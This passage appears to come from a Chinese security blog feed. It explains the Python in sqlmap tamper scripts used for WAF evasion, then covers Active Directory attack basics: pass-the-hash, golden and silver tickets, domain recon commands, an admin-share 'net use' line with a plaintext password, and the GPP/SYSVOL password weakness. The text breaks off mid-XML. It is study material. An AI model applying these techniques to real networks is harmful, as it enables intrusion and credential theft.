&#39;,&#39;.join(&quot;CHAR(%d)&quot; % _ for _ in getOrds(decodeHex(match.group(1))))</code></p><p>先来看看官方的getords的用法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getOrds</span>(<span class="hljs-params">value</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Returns ORD(...) representation of provided string value</span><br><span class="hljs-string"></span><br><span class="hljs-string">    &gt;&gt;&gt; getOrds(u&#x27;fo\\xf6bar&#x27;)</span><br><span class="hljs-string">    [102, 111, 246, 98, 97, 114]</span><br><span class="hljs-string">    &gt;&gt;&gt; getOrds(b&quot;fo\\xc3\\xb6bar&quot;)</span><br><span class="hljs-string">    [102, 111, 195, 182, 98, 97, 114]</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><span class="hljs-comment">#三元运算符</span><br>    <span class="hljs-keyword">return</span> [_ <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(_, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">ord</span>(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> value]<br></code></pre></td></tr></table></figure><p>return处是一个列表推导式</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">[expression <span class="hljs-keyword">for</span> <span class="hljs-keyword">variable</span> in <span class="hljs-comment">iterable]</span><br></code></pre></td></tr></table></figure><p>其中，<code>expression</code>是一个表达式，用来计算列表中的每个元素的值；<code>variable</code>是一个变量，用来接收<code>iterable</code>中的每个元素；<code>iterable</code>是一个可迭代对象，比如列表、元组、字符串等。</p><p>转化为正常写法就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_my_ord</span>(<span class="hljs-params">value</span>):<br>    result = []<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> value:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(_, <span class="hljs-built_in">int</span>):<br>            result.append(_)<br>        <span class="hljs-keyword">else</span>:<br>            result.append(<span class="hljs-built_in">ord</span>(_))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>所以我们就能整个理解后面的这一段语句了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">_ <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> getOrds(decodeHex(match.group(<span class="hljs-number">1</span>)))<br></code></pre></td></tr></table></figure><p>第一个_负责存储存储值</p><p>但是还有一个误区，这里的并不能够返回一个正常的值，而是会返回一个对象，比如下面这段代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">blanks = [<span class="hljs-string">&quot;%09&quot;</span>, <span class="hljs-string">&quot;%0A&quot;</span>, <span class="hljs-string">&quot;%0C&quot;</span>, <span class="hljs-string">&quot;%0D&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%s&quot;</span> % _  <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> blanks)<br></code></pre></td></tr></table></figure><p>print返回的值是</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;generator object &lt;genexpr&gt;</span> <span class="hljs-attribute">at</span> <span class="hljs-number">0</span>x000002B639C786D0&gt;<br></code></pre></td></tr></table></figure><p>这里只能作为return值来使用，例如我们使用下面的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_func</span>():<br>    blanks = [<span class="hljs-string">&quot;%09&quot;</span>, <span class="hljs-string">&quot;%0A&quot;</span>, <span class="hljs-string">&quot;%0C&quot;</span>, <span class="hljs-string">&quot;%0D&quot;</span>]<br>    <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;%s&quot;</span> % _  <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> blanks)<br><span class="hljs-keyword">if</span> __name__ ==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> gen_func():<br>        <span class="hljs-built_in">print</span>(value)<br></code></pre></td></tr></table></figure><p>这样就能够得到每一个值</p><h4 id="字符串中间插入字符randomcomment-py"><a href="#字符串中间插入字符randomcomment-py" class="headerlink" title="字符串中间插入字符randomcomment.py"></a>字符串中间插入字符randomcomment.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(word) - <span class="hljs-number">1</span>):<br>    _ += <span class="hljs-string">&quot;%s%s&quot;</span> % (<span class="hljs-string">&quot;/**/&quot;</span> <span class="hljs-keyword">if</span> randomRange(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>) <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span>, word[i])<br>_ += word[-<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><p><code>(&quot;/**/&quot; if randomRange(0, 1) else &quot;&quot;)</code> 是一个条件表达式，它表示如果randomRange(0, 1)的结果是1，就返回<code>/**/</code>这个字符串，否则返回空字符串<code>&quot;&quot;</code>。randomRange(0, 1)是一个函数，它可以生成0或1的随机数。</p><blockquote><p>格式大概是这样的(第一次见这种写法)</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">value1 <span class="hljs-keyword">if</span> <span class="hljs-keyword">condition</span> <span class="hljs-keyword">else</span> value2<br></code></pre></td></tr></table></figure><p>它的意思是根据条件的真假，返回不同的值。如果条件为真，就返回value1，如果条件为假，就返回value2。比如，如果我们写：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-string">&quot;yes&quot;</span> <span class="hljs-keyword">if</span> <span class="hljs-number">1</span> &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;no&quot;</span><br></code></pre></td></tr></table></figure><p>它的意思是如果1大于0，就返回”yes”，否则返回”no”。因为1大于0是一个真的条件，所以这个表达式的结果是”yes”。</p><p>在这一段话中，我们写了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;/**/&quot;</span> <span class="hljs-keyword">if</span> <span class="hljs-title function_">randomRange</span><span class="hljs-params">(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>它的意思是如果randomRange(0, 1)的结果是1，就返回”&#x2F;**&#x2F;“，否则返回””。randomRange(0, 1)是一个函数，它可以生成0或1的随机数。所以这个表达式的结果有两种可能：</p><ul><li>如果randomRange(0, 1)生成的是1，就返回”&#x2F;**&#x2F;“</li><li>如果randomRange(0, 1)生成的是0，就返回””</li></ul><p>这样就实现了随机地加上或不加上”&#x2F;**&#x2F;“符号的效果。</p></blockquote><p>到了这里tamper模块的基本东西我们就学完了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>域渗透基础知识</title>
    <link href="/decemberus.com/2023/08/02/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/decemberus.com/2023/08/02/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="域渗透基础知识"><a href="#域渗透基础知识" class="headerlink" title="域渗透基础知识"></a>域渗透基础知识</h1><h2 id="攻击域基础知识"><a href="#攻击域基础知识" class="headerlink" title="攻击域基础知识"></a>攻击域基础知识</h2><h3 id="SPN服务主主体名"><a href="#SPN服务主主体名" class="headerlink" title="SPN服务主主体名"></a>SPN服务主主体名</h3><p>服务主体名(SPNs)是运行在服务器上服务的唯一标识符。每一个使用Kerberos 身份验证的服务都要有个SPN以使客户端能够在网络上标识这个服务。没有正确的设置<code>SPNs</code>,<code>Kerberos</code>身份验证就是不可能的。</p><p>SPN服务可以使用别名或者主机名称向域注册SPN，注册完成后，可在域控使用ADSI编辑器连接到<code>LDAP</code>目录，查看服务的<code>SPN</code>。</p><h3 id="身份委派"><a href="#身份委派" class="headerlink" title="身份委派"></a>身份委派</h3><p><code>Kerberos V5</code>协议包括一个允许服务扮演客户端连接到其他服务器上的服务的代理机制,<code>NTLM</code>没有这样的功能。</p><p>在一个域中，A使用Kerberos 身份验证访问服务B,B再使用A的身份去访问C，这个过程就可以理解为委派;</p><h3 id="SAM数据库"><a href="#SAM数据库" class="headerlink" title="SAM数据库"></a>SAM数据库</h3><p>存储本地用户账户和组的数据库</p><p>域控中NTDS.dit的 hash，ntds.dit,文件是域环境中域控上会有的-个文件,这个文件存储着域内所有用户的凭据信息(hash)</p><h3 id="PTH哈希传递攻击"><a href="#PTH哈希传递攻击" class="headerlink" title="PTH哈希传递攻击"></a>PTH哈希传递攻击</h3><p>windows下的用户密码hash , mimikatz从内存dump出hash传递攻击(Pass The Hash)，模拟pth来接管域控</p><blockquote><p>mimikatz可以读取明文密码</p></blockquote><h3 id="PTT攻击"><a href="#PTT攻击" class="headerlink" title="PTT攻击"></a>PTT攻击</h3><p>Kerberos协议使用票据认证从而可以伪造票据</p><p><a href="https://www.cnblogs.com/bmjoker/p/10355979.html">5.内网渗透之PTH&amp;PTT&amp;PTK - bmjoker - 博客园 (cnblogs.com)</a></p><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>利用<code>krbtgt</code>（一个账户，安装域控的时候就会默认有这个账户）的hash来伪造TGT的内容</p><p><a href="https://blog.csdn.net/qq_41874930/article/details/108266378">黄金票据的制作与使用_Shanfenglan7的博客-CSDN博客</a></p><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>伪造的服务票据，只能用来访问特定的服务</p><p><a href="https://mp.weixin.qq.com/s/4eroblcVS0dwo26fbzA3-Q">windows域环境下认证和攻击初识 (qq.com)</a></p><h2 id="NTLM身份认证"><a href="#NTLM身份认证" class="headerlink" title="NTLM身份认证"></a>NTLM身份认证</h2><h3 id="NTLM-v2认证"><a href="#NTLM-v2认证" class="headerlink" title="NTLM v2认证"></a>NTLM v2认证</h3><p>(1)协商:确认双方协议版本，加密等级</p><p>(2)质询&#x2F;应答&#x2F;信息交换的过程</p><p>(3)认证结果</p><p>分为本地认证和网络认证</p><p>场景1:无网络时本地认证;<br>场景2:有网络，在工作组→使用;<br>场景3:在域中，当Kerberos认证失败，使用;</p><h3 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h3><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230713200549120.png" alt="image-20230713200549120"> </p><p>RDP协议3389远程桌面适用场景2和3</p><p>用户登陆windows 时，windows首先会调用winlogon.exe进程接收用户输入的密码，之后密码会被传递给lsass.exe进程，进程会先在内存中存储一份明文密码，并将密码加密为NTLM hash，与本地SAM数据库中用户的NTLM hash对比，一致则登陆成功</p><h3 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h3><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230713200319344.png" alt="image-20230713200319344"> </p><p><img src="D:\mdimage\image-20230713200335710.png" alt="image-20230713200335710"> </p><p><img src="D:\mdimage\image-20230713200416832.png" alt="image-20230713200416832"> </p><h2 id="Kerberos身份认证"><a href="#Kerberos身份认证" class="headerlink" title="Kerberos身份认证"></a>Kerberos身份认证</h2><p>KDC(Key Distribution center)：密钥分发中心，在域环境中，KDC服务默认会安装在域控中。</p><p>AS(Authentication Service)：认证服务，验证client的credential(身份认证信息)，发放TGT。</p><p>TGT(Ticket Granting ticket)：票据授权票据，由KDC的AS发放，客户端获取到该票据后，以后申请其他应用的服务票据(ST)时，就不需要向KDC的AS提交身份认证信息(credential)，TGT具有一定的有效期。</p><p>TGS(Ticket Granting Service)：票据授权服务，验证TGT，发放ST。</p><p>ST(Service Ticket)：服务票据，由KDC的TGS发放，是客户端应用程序访问Server某个服务的凭证，Server端验证通过则完成Client与Server端信任关系的建立。</p><p>先由简到繁地去梳理以上术语的关系。首先Client想要访问Server的某个服务，就需要通过KDC的认证，获取到服务票据（ST），服务会验证服务票据（ST）来判断Client是否通过了KDC认证。为了避免Client每次访问Server的服务都要向KDC认证(输入密码)，KDC设计时分成了两个部分，一个是AS，另一个是TGS，AS接收Client的认证信息，认证通过后给Client发放一个可重复使用的票据TGT，后续Client使用这个TGT向TGS请求ST即可。</p><p>Authenticator：验证器，不能重复使用，与票据（时效内能重复使用）结合用来证明Client声明的身份，防止票据被冒用。</p><p>  <img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230726202206895.png" alt="image-20230726202206895"> </p><h2 id="金票据与银票据"><a href="#金票据与银票据" class="headerlink" title="金票据与银票据"></a>金票据与银票据</h2><p>在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个 Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的,所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。</p><p>黄金票据常用于权限维持。 当我们获得域控的控制权限后，有可能获取域内所有用户的hash，和krbtgt的hash。这时，由于一些原因导致我们失去对目标的控制权，但是我们还留有一个普通用户的权限，并且krbtgt的密码没有更改，此时我们可以利用krbtgt用户的ntlm hash制作黄金票据伪造tgt，重新获取域控的管理权限。</p><p>如果说黄金票据是伪造的TGT,那么白银票据就是伪造的ST。 在Kerberos认证的第三部，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST,从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问server上的指定服务了。 所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的门票只对部分服务起作用。</p><p><a href="https://www.freebuf.com/articles/others-articles/329728.html">域渗透之黄金票据与白银票据 - FreeBuf网络安全行业门户</a></p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> admins<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure><p>查看与管理成员用户组</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719185534416.png" alt="image-20230719185534416"> </p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> computers<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure><p>查看域机器</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719185457466.png" alt="image-20230719185457466"> </p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> controllers<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure><p>查看域控制器</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719185403299.png" alt="image-20230719185403299"> </p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\192.168.1.1\ipc$ <span class="hljs-string">&quot;tyhcwfc168lyj.&quot;</span> /user:<span class="hljs-string">&quot;administrator&quot;</span><br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> z: \\192.168.1.1\c$<br></code></pre></td></tr></table></figure><p>建立空对话并将目标的c盘映射到z盘</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">net <span class="hljs-keyword">use</span> <span class="hljs-symbol">z:</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>\ipc<span class="hljs-variable">$ </span><span class="hljs-string">&quot;tyhcwfc168lyj.&quot;</span> /<span class="hljs-symbol">user:</span><span class="hljs-string">&quot;administrator&quot;</span><br></code></pre></td></tr></table></figure><p>上面的命令一气和成版，可以发现多了一个被控盘</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719185603217.png" alt="image-20230719185603217"> </p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> share<br></code></pre></td></tr></table></figure><p>查看SMB指向的路径</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719185705971.png" alt="image-20230719185705971"> </p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> view <span class="hljs-number">192.168.1.1</span><br></code></pre></td></tr></table></figure><p>查看ip共享</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">view</span> /domain <span class="hljs-keyword">test</span>.com<br></code></pre></td></tr></table></figure><p>查看域列表</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719185920771.png" alt="image-20230719185920771"> </p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span><br></code></pre></td></tr></table></figure><p>查看当前运行的服务</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> accounts<br></code></pre></td></tr></table></figure><p>查看本地密码策略</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719190106173.png" alt="image-20230719190106173"> </p><p>如果在后面加上一个&#x2F;domain则是查看域的用户策略</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nbtstat</span> -a <span class="hljs-number">192.168.1.1</span><br></code></pre></td></tr></table></figure><p>查看计算机名称</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -ano</span><br></code></pre></td></tr></table></figure><p>查询网络连接</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">route print<br></code></pre></td></tr></table></figure><p>查看路由表</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719190331857.png" alt="image-20230719190331857"> </p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">tasklist <span class="hljs-string">/V</span><br></code></pre></td></tr></table></figure><p>查进程（对应用户的），可以后跟管道符查询对应的进程</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systeminfo</span><br></code></pre></td></tr></table></figure><p>查看系统信息，可以用来看打了什么补丁</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">qwinsta</span><br></code></pre></td></tr></table></figure><p>查看登录情况，也就是说这个账号有几个人在登陆</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">fsutil fsinfo drives</span><br></code></pre></td></tr></table></figure><p>查看驱动器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpupdate /force<br></code></pre></td></tr></table></figure><p>更新组策略，当渗透进去以后修改了组策略之后可以用这个更新</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">wmic qfe</span><br></code></pre></td></tr></table></figure><p>查补丁信息</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">wmic startup</span><br></code></pre></td></tr></table></figure><p>查看启动项</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">wmic service</span><br></code></pre></td></tr></table></figure><p>查看服务</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">wmic os</span><br></code></pre></td></tr></table></figure><p>查看OS信息</p><h1 id="域渗透之漏洞利用"><a href="#域渗透之漏洞利用" class="headerlink" title="域渗透之漏洞利用"></a>域渗透之漏洞利用</h1><h2 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h2><h3 id="查当前域控"><a href="#查当前域控" class="headerlink" title="查当前域控"></a>查当前域控</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span> /domain<br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">ipconfig /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719195910649.png" alt="image-20230719195910649"> </p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719195927706.png" alt="image-20230719195927706"> </p><h3 id="多台域控"><a href="#多台域控" class="headerlink" title="多台域控"></a>多台域控</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">nltest /DCLIST:<span class="hljs-keyword">test</span>.com<br></code></pre></td></tr></table></figure><p>DCLIST代表Domain Controller List</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719200340212.png" alt="image-20230719200340212"> </p><h3 id="查看域控组相关信息"><a href="#查看域控组相关信息" class="headerlink" title="查看域控组相关信息"></a>查看域控组相关信息</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;Domain</span> Controllers<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure><p>查看域管主机名</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net gruop <span class="hljs-string">&quot;domain admins&quot;</span> /<span class="hljs-built_in">domain</span><br></code></pre></td></tr></table></figure><p>查看域管理员</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net gruop /<span class="hljs-built_in">domain</span><br></code></pre></td></tr></table></figure><p>查看OU（组织单位）组织</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719200805235.png" alt="image-20230719200805235"> </p><h3 id="其他场景"><a href="#其他场景" class="headerlink" title="其他场景"></a>其他场景</h3><p>DNS地址通常就是域控地址</p><p>或者可以查看是否开放53，389，88端口</p><h2 id="信息搜集SPN"><a href="#信息搜集SPN" class="headerlink" title="信息搜集SPN"></a>信息搜集SPN</h2><p>SPN（注册服务主体名称）是个公开的服务，都可以访问，这样就无法区分是正常的还是攻击者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -s mysqlspn/test.com administrator<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230719201345393.png" alt="image-20230719201345393"> </p><p>注册spn</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">setspn -t test -q <span class="hljs-strong">*/*</span><br></code></pre></td></tr></table></figure><p>查询所有的spn</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -d mysqlspn/test.com administrator<br></code></pre></td></tr></table></figure><p>删除spn</p><h2 id="共享目录SYSVOL与GPP漏洞"><a href="#共享目录SYSVOL与GPP漏洞" class="headerlink" title="共享目录SYSVOL与GPP漏洞"></a>共享目录SYSVOL与GPP漏洞</h2><p>域控默认开放sysvol共享目录SMB服务、下发组策略文件等。在域控中的路径<code>C: \windows\SYSVOL\sysvol\test.com</code>记住一定是域控服务器</p><p>GPP漏洞:</p><p>密钥通过AES256的方式加密，私钥在微软官网公开，通过这个私钥可以解密sysvol中的密码</p><p>可以使用客户端命令查看目录结构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tree /f \\test.com\sysvol\<br></code></pre></td></tr></table></figure><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230720183256721.png" alt="image-20230720183256721"> </p><p>可以看到这里其实是没有一个计划任务xml文件的</p><p>用客户端在在控制面板中找到组策略管理</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230720183552936.png" alt="image-20230720183552936"> </p><p>新建一个TEST创建GPO后编辑组策略管理器</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230720183755012.png" alt="image-20230720183755012"> </p><p>在首选项里面写一个计划任务</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230720184504512.png" alt="image-20230720184504512"> </p><p>可以看到出现了这个xml</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230720184615014.png" alt="image-20230720184615014"> </p><p>按照他的路径可以找到这个xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml">PS C:\Users\Administrator&gt; Get-Content \\test.com\sysvol\test.com\Policies\&quot;&#123;5A13E73C-68CA-4D5A-B0F4-6F624169B2C8&#125;&quot;\Mach<br>ine\Preferences\ScheduledTasks\ScheduledTasks.xml<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ScheduledTasks</span> <span class="hljs-attr">clsid</span>=<span class="hljs-string">&quot;&#123;CC63F200-7309-4ba0-B154-A71CD118DBCC&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Task</span> <span class="hljs-attr">clsid</span>=<span class="hljs-string">&quot;&#123;2DEECB1C-261F-4e13-9B21-16FB83BC03BD&#125;&quot;</span> <span class="hljs-attr">nam</span></span><br><span class="hljs-tag"><span class="hljs-attr">e</span>=<span class="hljs-string">&quot;update&quot;</span> <span class="hljs-attr">image</span>=<span class="hljs-string">&quot;2&quot;</span> <span class="hljs-attr">changed</span>=<span class="hljs-string">&quot;2023-07-20 10:45:09&quot;</span> <span class="hljs-attr">uid</span>=<span class="hljs-string">&quot;&#123;992B3D03-FCFB-427A-A6CC-B2018E8B1399&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Properties</span> <span class="hljs-attr">action</span>=<span 